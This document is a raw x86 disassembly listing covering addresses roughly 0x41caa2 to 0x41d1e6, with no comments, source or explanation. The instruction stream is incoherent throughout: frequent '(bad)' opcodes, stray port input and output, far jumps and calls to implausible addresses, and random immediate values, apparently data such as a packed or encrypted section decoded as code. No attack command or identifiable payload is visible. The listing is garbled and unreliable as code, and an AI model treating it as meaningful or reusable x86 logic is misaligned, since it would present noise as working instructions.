  41caa2:	cmp    eax,0x1afc0bcc
  41caa7:	cwde   
  41caa8:	jmp    0x41ca63
  41caaa:	mov    ds:0x2bc657f1,eax
  41caaf:	shl    DWORD PTR [eax+0x6102b0bf],0xef
  41cab6:	inc    ebp
  41cab7:	jmp    0x151314fb
  41cabc:	cwde   
  41cabd:	jbe    0x41ca9e
  41cabf:	cdq    
  41cac0:	push   0x2d
  41cac2:	arpl   WORD PTR [edi-0x33],cx
  41cac5:	nop
  41cac6:	sbb    al,BYTE PTR [ebx]
  41cac8:	push   0x860ccb3
  41cacd:	in     eax,dx
  41cace:	mov    dl,0xdb
  41cad0:	and    al,0xef
  41cad2:	or     DWORD PTR [ecx-0x4b],0x3094e31d
  41cad9:	es cld 
  41cadb:	out    dx,eax
  41cadc:	mov    al,0x69
  41cade:	adc    DWORD PTR [esi],edx
  41cae0:	imul   esp,DWORD PTR [edx+0x47d6ace5],0xffffffc9
  41cae7:	in     al,dx
  41cae8:	pushf  
  41cae9:	mov    eax,ds:0x318c5dac
  41caee:	dec    edi
  41caef:	pop    esp
  41caf0:	mov    ah,0x4e
  41caf2:	mov    bh,0xad
  41caf4:	inc    ebx
  41caf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caf6:	or     ebx,DWORD PTR gs:[edi-0x6a125c2c]
  41cafd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cafe:	call   0xb505202e
  41cb03:	cmp    BYTE PTR [esp+edi*2-0x18],0x70
  41cb08:	in     al,dx
  41cb09:	sub    al,0xfb
  41cb0b:	inc    ecx
  41cb0c:	add    eax,0xa1ca598d
  41cb11:	dec    esi
  41cb12:	and    eax,0x501b1fb3
  41cb17:	int3   
  41cb18:	popa   
  41cb19:	aas    
  41cb1a:	sub    al,0xf7
  41cb1c:	push   es
  41cb1d:	cld    
  41cb1e:	sub    DWORD PTR ds:0xfb2614bb,eax
  41cb24:	jno    0x41cabb
  41cb26:	pop    es
  41cb27:	outs   dx,BYTE PTR ds:[esi]
  41cb28:	xchg   ecx,eax
  41cb29:	dec    edi
  41cb2a:	repz in al,0x4
  41cb2d:	shl    esp,1
  41cb2f:	jecxz  0x41cb25
  41cb31:	ret    
  41cb32:	mov    edi,0xfd84bf88
  41cb37:	jmp    0x41cb07
  41cb39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb3a:	cmc    
  41cb3b:	lock in al,dx
  41cb3d:	mov    edx,0x4bd40472
  41cb42:	int3   
  41cb43:	mov    ebx,0xe5722982
  41cb48:	pop    eax
  41cb49:	inc    edx
  41cb4a:	sbb    eax,DWORD PTR [ebp+0x7079fe]
  41cb50:	(bad)  
  41cb51:	sbb    eax,0x6bab9857
  41cb56:	push   0x8
  41cb58:	popa   
  41cb59:	pop    esi
  41cb5a:	in     eax,dx
  41cb5b:	mov    eax,ds:0x8cc2c9a7
  41cb60:	inc    edi
  41cb61:	or     eax,0x59c74aaf
  41cb66:	push   eax
  41cb67:	pop    ds
  41cb68:	ins    BYTE PTR es:[edi],dx
  41cb69:	das    
  41cb6a:	fs sbb al,0x93
  41cb6d:	xchg   DWORD PTR [eax],ebx
  41cb6f:	adc    ch,ch
  41cb71:	or     DWORD PTR [ebx+edx*1],edx
  41cb74:	mov    bl,0x6
  41cb76:	js     0x41cb75
  41cb78:	in     al,dx
  41cb79:	add    ch,BYTE PTR [eax]
  41cb7b:	cmc    
  41cb7c:	bound  ebx,QWORD PTR [ecx+0x15]
  41cb7f:	mov    al,0x20
  41cb81:	and    DWORD PTR [edi+0x47066f3b],0x64307c03
  41cb8b:	test   BYTE PTR [ebx+0x62eb45d9],dl
  41cb91:	fimul  DWORD PTR [edi-0x27]
  41cb94:	add    BYTE PTR [esi],dl
  41cb96:	(bad)  
  41cb97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb98:	aam    0x4c
  41cb9a:	sub    bh,BYTE PTR es:[eax]
  41cb9d:	adc    BYTE PTR [esi+0x235c8748],dh
  41cba3:	or     BYTE PTR [ebp+eax*2+0x5b],dl
  41cba7:	and    al,0xd7
  41cba9:	or     ebx,DWORD PTR ss:[eax-0x8]
  41cbad:	mov    ?,WORD PTR [esi-0x67]
  41cbb0:	rcr    BYTE PTR [edi+0x5d00bbe9],cl
  41cbb6:	jl     0x41cb8f
  41cbb8:	mov    ch,0x2
  41cbba:	cs dec eax
  41cbbc:	cmp    al,0x10
  41cbbe:	repz lds edx,FWORD PTR [edi+0x7cf63187]
  41cbc5:	jne    0x41cbcd
  41cbc7:	dec    ecx
  41cbc8:	mov    eax,ds:0x6857da41
  41cbcd:	xchg   ecx,eax
  41cbce:	(bad)  
  41cbcf:	jge    0x41cb78
  41cbd1:	or     eax,0x69f6cee1
  41cbd6:	xchg   esi,eax
  41cbd7:	les    ebp,FWORD PTR [esi-0x42]
  41cbda:	mov    ds:0x826a7053,al
  41cbdf:	mov    WORD PTR [ecx+0x27adb67e],gs
  41cbe5:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41cbe7:	dec    ebp
  41cbe8:	adc    ch,cl
  41cbea:	push   esp
  41cbeb:	outs   dx,BYTE PTR ds:[esi]
  41cbec:	and    eax,0xae3467b5
  41cbf1:	dec    edx
  41cbf2:	bswap  edi
  41cbf4:	test   al,0xfc
  41cbf6:	add    al,0xbd
  41cbf8:	mov    esi,0x8e0422b2
  41cbfd:	and    eax,DWORD PTR [edi-0x2c]
  41cc00:	bound  ecx,QWORD PTR [ebp-0xa206b11]
  41cc06:	push   cs
  41cc07:	(bad)  
  41cc08:	xchg   esp,eax
  41cc09:	sbb    dh,dl
  41cc0b:	xchg   esp,eax
  41cc0c:	ret    
  41cc0d:	mov    ah,0x48
  41cc0f:	mov    cl,dl
  41cc11:	lock dec ebp
  41cc13:	mov    al,ds:0x6ad45d6b
  41cc18:	addr16 jmp 0xc89b27ae
  41cc1e:	dec    eax
  41cc1f:	pop    ss
  41cc20:	jbe    0x41cbb9
  41cc22:	out    dx,al
  41cc23:	push   cs
  41cc24:	mov    ah,0x58
  41cc26:	in     al,0x50
  41cc28:	fcom   QWORD PTR [eax+0x108ccbf0]
  41cc2e:	xchg   ecx,eax
  41cc2f:	xchg   ebp,eax
  41cc30:	push   esp
  41cc31:	adc    al,0x2a
  41cc33:	or     DWORD PTR [esi],esi
  41cc35:	clc    
  41cc36:	fs daa 
  41cc38:	scas   al,BYTE PTR es:[edi]
  41cc39:	push   edi
  41cc3a:	sbb    BYTE PTR [ebx],0x1e
  41cc3d:	dec    ebx
  41cc3e:	add    eax,0x34540277
  41cc43:	addr16 mov ebp,0x29f5e9d2
  41cc49:	retf   
  41cc4a:	cwde   
  41cc4b:	ja     0x41ccb1
  41cc4d:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41cc4f:	stc    
  41cc50:	pop    edx
  41cc51:	repz ret 
  41cc53:	add    al,0xb1
  41cc55:	mov    DWORD PTR [ebp-0x40],edi
  41cc58:	sub    bh,BYTE PTR [eax+0xd]
  41cc5b:	sbb    ebp,DWORD PTR [edi+edx*2]
  41cc5e:	push   edx
  41cc5f:	dec    ebx
  41cc60:	jg     0x41cc9f
  41cc62:	shl    ch,0xf1
  41cc65:	push   esp
  41cc66:	and    DWORD PTR [ebp-0x402a722e],esp
  41cc6c:	data16 fsubr DWORD PTR [edi+ecx*4]
  41cc70:	aaa    
  41cc71:	cli    
  41cc72:	dec    esp
  41cc73:	(bad)  
  41cc74:	out    dx,eax
  41cc75:	(bad)  
  41cc76:	push   esi
  41cc77:	push   esi
  41cc78:	mov    esp,0x75367570
  41cc7d:	mov    edi,0x64e426a1
  41cc82:	rcl    edi,1
  41cc84:	cdq    
  41cc85:	fisttp WORD PTR [ecx]
  41cc87:	imul   esp,DWORD PTR [eax],0x47
  41cc8a:	and    BYTE PTR [ebx],ch
  41cc8c:	add    ah,BYTE PTR [ecx-0x7]
  41cc8f:	mov    al,0x8b
  41cc91:	fcom   DWORD PTR [eax]
  41cc93:	lods   eax,DWORD PTR ds:[esi]
  41cc94:	adc    eax,0xa8135073
  41cc99:	push   0xb0590baf
  41cc9e:	cmp    dl,dh
  41cca0:	mov    ebp,0xb2365ea1
  41cca5:	daa    
  41cca6:	xor    al,cl
  41cca8:	mov    cl,0x68
  41ccaa:	ret    
  41ccab:	punpckhwd mm7,QWORD PTR [eax]
  41ccae:	fadd   QWORD PTR [edx+0x74]
  41ccb1:	dec    esp
  41ccb2:	mov    eax,ds:0x1ab6d6be
  41ccb7:	loopne 0x41cce3
  41ccb9:	mov    dh,0xfd
  41ccbb:	retf   0xb6f7
  41ccbe:	mov    dl,0x20
  41ccc0:	in     al,dx
  41ccc1:	cmp    eax,0x7f0e4209
  41ccc6:	int    0xc0
  41ccc8:	or     esp,DWORD PTR [ebp+0x21]
  41cccb:	sbb    esp,DWORD PTR [edx+0x7f9234c1]
  41ccd1:	push   ebp
  41ccd2:	scas   al,BYTE PTR es:[edi]
  41ccd3:	xchg   esp,eax
  41ccd4:	sub    BYTE PTR [ebx-0x63],0xb
  41ccd8:	jns    0x41cc98
  41ccda:	push   ebp
  41ccdb:	and    BYTE PTR [ebx+0x37],cl
  41ccde:	mov    BYTE PTR [edx],cl
  41cce0:	int    0xb1
  41cce2:	aam    0x55
  41cce4:	adc    ecx,DWORD PTR [ebx-0x6d]
  41cce7:	push   ebp
  41cce8:	cs jecxz 0x41ccdd
  41cceb:	test   ebx,esi
  41cced:	bound  esp,QWORD PTR [ebp+eax*2+0x3d7f55e6]
  41ccf4:	fldenv [edi+0x72]
  41ccf7:	pop    edi
  41ccf8:	lds    ebx,FWORD PTR [ecx]
  41ccfa:	cmp    DWORD PTR [edx],edi
  41ccfc:	dec    ebp
  41ccfd:	or     esi,edx
  41ccff:	call   0xf2fd5c3d
  41cd04:	pop    esi
  41cd05:	sbb    al,0x54
  41cd07:	mov    esi,0x4bb07de3
  41cd0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd0d:	scas   eax,DWORD PTR es:[edi]
  41cd0e:	and    eax,edi
  41cd10:	fwait
  41cd11:	adc    bl,al
  41cd13:	not    BYTE PTR ds:0xd3cc4e91
  41cd19:	hlt    
  41cd1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd1b:	imul   ebp,eax,0x9f0f33eb
  41cd21:	retf   0x4e81
  41cd24:	push   es
  41cd25:	jns    0x41cca8
  41cd27:	dec    eax
  41cd28:	sub    BYTE PTR [esi-0x41ecb3fb],dh
  41cd2e:	sbb    eax,0xcec4dc3a
  41cd33:	add    edi,ebp
  41cd35:	push   ds
  41cd36:	repnz mov ch,0x89
  41cd39:	adc    BYTE PTR [edi+0x14d6ca5c],al
  41cd3f:	jbe    0x41cd03
  41cd41:	outs   dx,DWORD PTR ds:[esi]
  41cd42:	xchg   ebp,eax
  41cd43:	adc    dh,BYTE PTR [edi-0x60]
  41cd46:	mov    ah,0x7a
  41cd48:	in     al,0x93
  41cd4a:	int3   
  41cd4b:	daa    
  41cd4c:	sbb    DWORD PTR [edi-0x25],edi
  41cd4f:	xor    si,di
  41cd52:	mov    ds:0x430f5612,al
  41cd57:	sub    edi,DWORD PTR [eax+0x32db19cd]
  41cd5d:	daa    
  41cd5e:	adc    cl,cl
  41cd60:	cdq    
  41cd61:	aad    0xd3
  41cd63:	sbb    BYTE PTR [eax],bh
  41cd65:	jno    0x41cce8
  41cd67:	xchg   ecx,eax
  41cd68:	test   al,0x2b
  41cd6a:	jo     0x41cd3b
  41cd6c:	dec    edi
  41cd6d:	popa   
  41cd6e:	call   0x91a1:0x82afb757
  41cd75:	and    eax,0x9006040a
  41cd7a:	cld    
  41cd7b:	and    ecx,DWORD PTR [edi-0x54]
  41cd7e:	(bad)  
  41cd7f:	arpl   WORD PTR [ecx+0x3380158c],cx
  41cd85:	adc    eax,0xd44af433
  41cd8a:	inc    edx
  41cd8b:	or     esi,DWORD PTR [ebx]
  41cd8d:	arpl   WORD PTR [ebp+0x36],di
  41cd90:	loope  0x41cd61
  41cd92:	shr    DWORD PTR [esi-0x5775d2cd],1
  41cd98:	pop    esp
  41cd99:	(bad)  
  41cd9a:	sbb    BYTE PTR [ecx-0x854e2a3],bl
  41cda0:	sub    eax,0x33134d74
  41cda5:	mov    dh,0x3a
  41cda7:	scas   eax,DWORD PTR es:[edi]
  41cda8:	xchg   esi,eax
  41cda9:	mov    ebp,0x5ebf95e4
  41cdae:	mov    ecx,0xd8512833
  41cdb3:	adc    al,0x9
  41cdb5:	fiadd  DWORD PTR es:[ecx+eax*8+0x61ba54bc]
  41cdbd:	inc    edx
  41cdbe:	sub    DWORD PTR [eax+0x5f],ebx
  41cdc1:	arpl   bp,si
  41cdc3:	shl    DWORD PTR [edx],cl
  41cdc5:	xor    DWORD PTR [ebx-0x28],esi
  41cdc8:	pusha  
  41cdc9:	scas   eax,DWORD PTR es:[edi]
  41cdca:	aas    
  41cdcb:	out    dx,al
  41cdcc:	pusha  
  41cdcd:	mov    edi,0x118791f7
  41cdd2:	inc    eax
  41cdd3:	xchg   ecx,eax
  41cdd4:	(bad)  
  41cdd5:	aad    0x7e
  41cdd7:	lock in eax,dx
  41cdd9:	shr    eax,1
  41cddb:	iret   
  41cddc:	pop    ebx
  41cddd:	gs retf 
  41cddf:	cld    
  41cde0:	or     al,0x6b
  41cde2:	push   0x32
  41cde4:	out    dx,al
  41cde5:	pop    eax
  41cde6:	cwde   
  41cde7:	and    eax,0xdd5134c7
  41cdec:	sar    BYTE PTR [edi+0x8],cl
  41cdef:	lods   eax,DWORD PTR ds:[esi]
  41cdf0:	mov    esp,0x988480a6
  41cdf5:	cmp    al,0x63
  41cdf7:	sub    DWORD PTR [ebp-0x6a],eax
  41cdfa:	jo     0x41ce28
  41cdfc:	outs   dx,BYTE PTR ds:[esi]
  41cdfd:	dec    edx
  41cdfe:	sahf   
  41cdff:	inc    ebx
  41ce00:	stc    
  41ce01:	aaa    
  41ce02:	cmp    al,dl
  41ce04:	jp     0x41ce66
  41ce06:	mov    edi,0x1a5e86c3
  41ce0b:	imul   ecx,ebx,0xdbd43b58
  41ce11:	outs   dx,DWORD PTR ds:[esi]
  41ce12:	cmc    
  41ce13:	mov    edi,0x24926c37
  41ce18:	cli    
  41ce19:	loop   0x41ce2a
  41ce1b:	sbb    al,0x9c
  41ce1d:	xor    edi,DWORD PTR [esi+0x2e]
  41ce20:	mov    ?,WORD PTR [esi-0x3bd87bc3]
  41ce26:	mov    bh,0x28
  41ce28:	loop   0x41ce4c
  41ce2a:	mov    ah,0xe
  41ce2c:	pusha  
  41ce2d:	cwde   
  41ce2e:	jl     0x41cdba
  41ce30:	add    al,0xc0
  41ce32:	jne    0x41ce76
  41ce34:	hlt    
  41ce35:	and    esp,DWORD PTR [eax]
  41ce37:	and    al,0x1b
  41ce39:	xor    dh,dl
  41ce3b:	pop    ss
  41ce3c:	mov    esi,0x78d7768a
  41ce41:	adc    ch,BYTE PTR cs:[edx]
  41ce44:	push   esi
  41ce46:	jnp    0x41ce5a
  41ce48:	xchg   edi,eax
  41ce49:	pop    esp
  41ce4a:	cmp    bl,BYTE PTR [esi+ebx*8-0x17]
  41ce4e:	wbinvd 
  41ce50:	mov    al,ds:0xec064e4e
  41ce55:	adc    bh,bh
  41ce57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce58:	inc    edi
  41ce59:	(bad)  [ecx-0x5d]
  41ce5c:	mov    esp,0xd176d098
  41ce61:	sub    eax,0xe1df5af6
  41ce66:	ja     0x41ce2b
  41ce68:	int    0xb4
  41ce6a:	aad    0x22
  41ce6c:	ja     0x41cec3
  41ce6e:	neg    dh
  41ce70:	jne    0x41ce66
  41ce72:	in     al,dx
  41ce73:	pop    ecx
  41ce74:	jb     0x41cede
  41ce76:	cmp    BYTE PTR [edx],0x26
  41ce79:	sub    edi,DWORD PTR [ecx-0x4bab0f58]
  41ce7f:	inc    esp
  41ce80:	repnz retf 
  41ce82:	test   ecx,edx
  41ce84:	es mov esi,0xcd21722b
  41ce8a:	ret    0x29f5
  41ce8d:	test   BYTE PTR [ebx-0x67cd1b40],0xcc
  41ce94:	sub    DWORD PTR [ebp-0x5],ebp
  41ce97:	sbb    al,0xc
  41ce99:	xchg   BYTE PTR [ebp+ecx*4+0x27],dh
  41ce9d:	or     eax,0xf50a2423
  41cea2:	aam    0xea
  41cea4:	or     BYTE PTR [eax],bl
  41cea6:	sub    eax,0x955522e8
  41ceab:	jns    0x41ce55
  41cead:	dec    ecx
  41ceae:	sub    DWORD PTR [eax+ebx*1],ebp
  41ceb1:	pop    es
  41ceb2:	in     eax,0x95
  41ceb4:	out    dx,eax
  41ceb5:	pop    ss
  41ceb6:	mov    ebp,0x70c66c4
  41cebb:	fisttp QWORD PTR [ecx+0x72522ec]
  41cec1:	fcomp  QWORD PTR [ebx+0x53]
  41cec4:	aas    
  41cec5:	retf   0xc773
  41cec8:	retf   
  41cec9:	pop    ebp
  41ceca:	out    0x33,eax
  41cecc:	scas   eax,DWORD PTR es:[edi]
  41cecd:	ins    DWORD PTR es:[edi],dx
  41cece:	aad    0x4
  41ced0:	add    eax,esi
  41ced2:	jmp    0x748f:0x6f9524bd
  41ced9:	cs out 0x7e,eax
  41cedc:	mov    esi,0x82a0f44c
  41cee1:	and    dl,dh
  41cee3:	mov    dh,0x17
  41cee5:	adc    al,0x0
  41cee7:	xchg   edx,eax
  41cee8:	adc    edx,0xffffff89
  41ceeb:	sti    
  41ceec:	pop    ebp
  41ceed:	stc    
  41ceee:	inc    eax
  41ceef:	pop    eax
  41cef0:	mov    dl,0x8d
  41cef2:	mov    ebx,0x6127ce21
  41cef7:	mov    al,ds:0x5f99e15f
  41cefc:	xor    BYTE PTR [esi+ebp*1],0x1
  41cf00:	push   es
  41cf01:	add    ebx,ebx
  41cf03:	retf   0xc4ef
  41cf06:	stc    
  41cf07:	xchg   edx,eax
  41cf08:	(bad)  
  41cf09:	pusha  
  41cf0a:	mov    eax,ds:0x5f5690ac
  41cf0f:	mov    al,0x5e
  41cf11:	inc    ecx
  41cf12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf13:	mov    ch,BYTE PTR [eax+0x17]
  41cf16:	rol    DWORD PTR [esi],1
  41cf18:	lahf   
  41cf19:	ss clc 
  41cf1b:	push   eax
  41cf1c:	push   eax
  41cf1d:	and    edi,DWORD PTR [ecx+0x10]
  41cf20:	pop    ds
  41cf21:	and    cl,BYTE PTR [ebx-0x43]
  41cf24:	xchg   edi,eax
  41cf25:	ja     0x41cecb
  41cf27:	sbb    dl,BYTE PTR [ebx+0x77755c82]
  41cf2d:	xor    al,0xa6
  41cf2f:	outs   dx,DWORD PTR ds:[esi]
  41cf30:	jl     0x41cf4e
  41cf32:	push   eax
  41cf33:	daa    
  41cf34:	cld    
  41cf35:	sbb    eax,0xebeb9dd7
  41cf3a:	ins    BYTE PTR es:[edi],dx
  41cf3b:	cmp    eax,0xe5166068
  41cf40:	(bad)  
  41cf42:	adc    BYTE PTR [eax+0x168e053d],0x45
  41cf49:	(bad)  
  41cf4a:	jno    0x41cefa
  41cf4c:	inc    ebx
  41cf4d:	adc    dl,BYTE PTR [edi+0x3a]
  41cf50:	popf   
  41cf51:	cld    
  41cf52:	je     0x41cf67
  41cf54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf55:	mov    esi,0xadb6463d
  41cf5a:	out    0xa0,eax
  41cf5c:	add    bl,0xd0
  41cf5f:	stos   BYTE PTR es:[edi],al
  41cf60:	pusha  
  41cf61:	pop    ds
  41cf62:	mov    ds:0x4d552c54,eax
  41cf67:	cld    
  41cf68:	mov    BYTE PTR [ecx*2+0x6adbc6e7],ch
  41cf6f:	inc    ecx
  41cf70:	and    al,0x64
  41cf72:	sbb    DWORD PTR [eax-0xb385b32],ecx
  41cf78:	repz or DWORD PTR [edi-0xd6ec70c],0x43
  41cf80:	sbb    edi,DWORD PTR [eax-0x11]
  41cf83:	sbb    eax,0x6a53b8d
  41cf88:	pop    ebp
  41cf89:	dec    esp
  41cf8a:	push   0xaf0d5168
  41cf8f:	cmp    BYTE PTR [esi+0x25389fcc],bl
  41cf95:	jbe    0x41d000
  41cf97:	icebp  
  41cf98:	xchg   esi,eax
  41cf99:	adc    BYTE PTR [edi+edi*2-0x71],ah
  41cf9d:	mov    ebx,0xca191a7a
  41cfa2:	add    DWORD PTR [ecx+0x172bdb18],edx
  41cfa8:	cmp    al,BYTE PTR [ecx+esi*1-0xf]
  41cfac:	js     0x41cf51
  41cfae:	es enter 0x6541,0xe0
  41cfb3:	push   0x48
  41cfb5:	gs dec eax
  41cfb7:	pop    ebx
  41cfb8:	inc    ebx
  41cfb9:	pushf  
  41cfba:	mov    WORD PTR [ebx+ecx*4-0x31],es
  41cfbe:	stos   DWORD PTR es:[edi],eax
  41cfbf:	mov    edi,0x8bbd1cb1
  41cfc4:	pop    esp
  41cfc5:	ror    DWORD PTR [ebx-0x296e87e8],cl
  41cfcb:	adc    DWORD PTR [eax],esi
  41cfcd:	dec    edx
  41cfce:	stc    
  41cfcf:	mov    WORD PTR [esi],gs
  41cfd1:	fiadd  WORD PTR [edx-0x25]
  41cfd4:	adc    al,0xb
  41cfd6:	or     WORD PTR [esi+0x72],0x7d
  41cfdb:	test   ax,0x91bd
  41cfdf:	and    eax,0x43a0bf08
  41cfe4:	int3   
  41cfe5:	adc    al,0x29
  41cfe7:	(bad)  
  41cfe8:	lock in eax,dx
  41cfea:	test   eax,0x5b86fb39
  41cfef:	mov    al,0xed
  41cff1:	jne    0x41d056
  41cff3:	xchg   ecx,eax
  41cff4:	pop    ss
  41cff5:	jg     0x41cf82
  41cff7:	jl     0x41cf89
  41cff9:	mov    ch,ch
  41cffb:	cli    
  41cffc:	dec    eax
  41cffd:	fwait
  41cffe:	push   eax
  41cfff:	mov    bl,0x7c
  41d001:	push   ss
  41d002:	jb     0x41d052
  41d004:	jge    0x41cfc0
  41d006:	test   edx,ecx
  41d008:	ins    DWORD PTR es:[edi],dx
  41d009:	mov    DWORD PTR [ebx-0x1b],ecx
  41d00c:	in     eax,0xaa
  41d00e:	int    0xe7
  41d010:	push   0xec475811
  41d015:	inc    edx
  41d016:	in     al,dx
  41d017:	inc    edi
  41d018:	fwait
  41d019:	je     0x41d03a
  41d01b:	sub    edi,DWORD PTR ds:0xfad72be1
  41d021:	xor    bl,BYTE PTR [edx+0x65a8aba0]
  41d027:	ja     0x41cfcb
  41d029:	outs   dx,DWORD PTR ds:[esi]
  41d02a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d02b:	cmc    
  41d02c:	add    BYTE PTR cs:[edi+0x61],bl
  41d030:	cwde   
  41d031:	test   BYTE PTR [edx],0x47
  41d034:	sbb    dl,ch
  41d036:	sbb    dh,BYTE PTR [ecx+0x27]
  41d039:	jmp    0x23c0e270
  41d03e:	aas    
  41d03f:	mov    ebp,DWORD PTR [edi]
  41d041:	stos   BYTE PTR es:[edi],al
  41d042:	xchg   edx,eax
  41d043:	pop    eax
  41d044:	mov    edx,DWORD PTR [ecx-0x45]
  41d047:	add    al,0xa1
  41d049:	xor    bh,dl
  41d04b:	mov    eax,ds:0x821fa90d
  41d050:	dec    esi
  41d051:	iret   
  41d052:	pusha  
  41d053:	retf   0x8a15
  41d056:	aad    0xed
  41d058:	leave  
  41d059:	in     al,0x8b
  41d05b:	adc    BYTE PTR [ebp+eiz*8-0x9542a3b],cl
  41d062:	call   0xf1cb53f5
  41d067:	sbb    DWORD PTR [ebx+0x73],ebx
  41d06a:	psrlw  mm3,QWORD PTR [ebp-0x2b]
  41d06e:	iret   
  41d06f:	jmp    0xaed7:0x88f4cd6c
  41d076:	ds in  al,0xa0
  41d079:	sub    al,0x22
  41d07b:	sbb    eax,0x5cdf596f
  41d080:	or     eax,0xdafa2770
  41d085:	and    cl,BYTE PTR [edi+0x4f]
  41d088:	inc    eax
  41d089:	push   edi
  41d08a:	popa   
  41d08b:	clc    
  41d08c:	fnsave ds:[ebp-0x1c72de05]
  41d093:	inc    edx
  41d094:	jmp    0x33aaaa36
  41d099:	pop    edi
  41d09a:	jp     0x41d0d9
  41d09c:	mov    esi,0x40975aa7
  41d0a1:	push   eax
  41d0a2:	pop    esi
  41d0a3:	xor    al,0x3f
  41d0a5:	mov    ds:0xe2c7adb0,eax
  41d0aa:	mov    ebx,0x191ff5d3
  41d0af:	pop    ebp
  41d0b0:	iret   
  41d0b1:	fistp  DWORD PTR [ebx]
  41d0b3:	ficom  DWORD PTR [ebx+0x3eb5ef4e]
  41d0b9:	aas    
  41d0ba:	repz retf 0xe108
  41d0be:	and    BYTE PTR [edx+ebx*2],0xcf
  41d0c2:	jne    0x41d12c
  41d0c4:	ret    
  41d0c5:	push   edx
  41d0c6:	js     0x41d04a
  41d0c8:	xchg   ebp,eax
  41d0c9:	mov    ds:0x9b99c7fd,eax
  41d0ce:	inc    eax
  41d0cf:	(bad)  
  41d0d0:	out    dx,al
  41d0d1:	dec    ebx
  41d0d2:	or     bl,BYTE PTR [edx+0x45cc5005]
  41d0d8:	push   edx
  41d0d9:	push   ebp
  41d0da:	push   eax
  41d0db:	add    DWORD PTR [ebp-0xcab7fec],ebp
  41d0e1:	call   FWORD PTR [edi+0x1d2173a2]
  41d0e7:	xchg   ecx,eax
  41d0e8:	pop    edx
  41d0e9:	in     al,dx
  41d0ea:	pop    edx
  41d0eb:	cmp    edi,DWORD PTR [ebp+0x7b]
  41d0ee:	les    edi,FWORD PTR [edx+0x60e3cc2c]
  41d0f4:	add    esp,ebx
  41d0f6:	shr    BYTE PTR [edi],cl
  41d0f8:	or     dl,cl
  41d0fa:	stos   DWORD PTR es:[edi],eax
  41d0fb:	rcl    BYTE PTR [edx],cl
  41d0fd:	in     eax,dx
  41d0fe:	add    BYTE PTR [eax],0x92
  41d101:	sub    eax,0xa0ff92ae
  41d106:	aam    0x4a
  41d108:	leave  
  41d109:	cmp    al,0x17
  41d10b:	dec    eax
  41d10c:	inc    ebx
  41d10d:	aaa    
  41d10e:	sbb    eax,eax
  41d110:	popf   
  41d111:	mov    ecx,0x4d7c407b
  41d116:	add    eax,0x5fd7f0f5
  41d11b:	mov    dh,0xd7
  41d11d:	dec    ecx
  41d11e:	push   ebp
  41d11f:	xchg   esp,eax
  41d120:	xor    edi,DWORD PTR [esi+0x66]
  41d123:	sahf   
  41d124:	sbb    bh,BYTE PTR [esp+esi*1+0x79]
  41d128:	jmp    0x2381f98b
  41d12d:	push   ebx
  41d12e:	jge    0x41d11a
  41d130:	pop    edx
  41d131:	int3   
  41d132:	mov    bl,0x86
  41d134:	stc    
  41d135:	sub    al,0xca
  41d137:	(bad)  
  41d138:	sti    
  41d139:	jne    0x41d186
  41d13b:	test   eax,ecx
  41d13d:	leave  
  41d13e:	cmp    al,BYTE PTR [esi+0x41d5d76]
  41d144:	fild   QWORD PTR [ecx-0xe]
  41d147:	retf   0x377e
  41d14a:	lds    eax,FWORD PTR [edx-0x3d]
  41d14d:	ins    BYTE PTR es:[edi],dx
  41d14e:	add    al,0x8
  41d150:	add    eax,0x3be914da
  41d155:	pop    edx
  41d156:	clc    
  41d157:	push   ds
  41d158:	mov    ah,0xf6
  41d15a:	jb     0x41d18d
  41d15c:	mov    dl,0x5c
  41d15e:	inc    eax
  41d15f:	loop   0x41d1cc
  41d161:	nop
  41d162:	mov    BYTE PTR [ecx+ebx*1],0xf3
  41d166:	and    DWORD PTR [ecx],ecx
  41d168:	mov    dl,0x30
  41d16a:	add    esp,DWORD PTR [eax]
  41d16c:	mov    ah,0x23
  41d16e:	leave  
  41d16f:	and    cl,BYTE PTR ds:0x34f2e5e4
  41d175:	add    DWORD PTR [esi],edi
  41d177:	mov    bl,0x9c
  41d179:	pusha  
  41d17a:	imul   eax,DWORD PTR [esi-0x59aeeb66],0xffffffd5
  41d181:	shl    DWORD PTR [edx],1
  41d183:	test   BYTE PTR [ebx+ebp*1-0x42ae6787],dh
  41d18a:	jg     0x41d1be
  41d18c:	add    eax,0x1827d271
  41d191:	jmp    0x41d12e
  41d193:	frstor [ecx+0x74]
  41d196:	push   0x6887d575
  41d19b:	sub    bl,BYTE PTR [ebx-0x66]
  41d19e:	neg    eax
  41d1a0:	mov    ebp,0x7c3d0d6
  41d1a5:	and    esi,eax
  41d1a7:	stos   BYTE PTR es:[edi],al
  41d1a8:	and    DWORD PTR [edi+0x5eaf5e7f],ebp
  41d1ae:	mov    dh,0x1
  41d1b0:	dec    ebp
  41d1b1:	cmp    al,0xd2
  41d1b3:	lea    ebp,[ecx-0x11cacfca]
  41d1b9:	push   0xfffffff0
  41d1bb:	dec    esp
  41d1bc:	mov    bh,0xb9
  41d1be:	lea    esi,[eax-0xf0e252c]
  41d1c4:	mov    dh,ah
  41d1c6:	push   ds
  41d1c7:	inc    ecx
  41d1c8:	xchg   ebx,eax
  41d1c9:	retf   
  41d1ca:	pop    esp
  41d1cb:	and    BYTE PTR [edi],dh
  41d1cd:	inc    ebp
  41d1ce:	out    dx,al
  41d1cf:	outs   dx,BYTE PTR ds:[esi]
  41d1d0:	pop    eax
  41d1d1:	and    DWORD PTR [ebp-0x50],0xffffffa2
  41d1d5:	mov    ecx,ds
  41d1d7:	pop    edi
  41d1d8:	dec    eax
  41d1d9:	retf   0x16c1
  41d1dc:	push   esi
  41d1dd:	cmp    BYTE PTR [eax],dl
  41d1df:	mov    bh,BYTE PTR [edx-0x3b]
  41d1e2:	jecxz  0x41d20b
  41d1e4:	dec    ebp
  41d1e5:	dec    ebx
  41d1e6:	ins    DWORD PTR es:[edi],dx
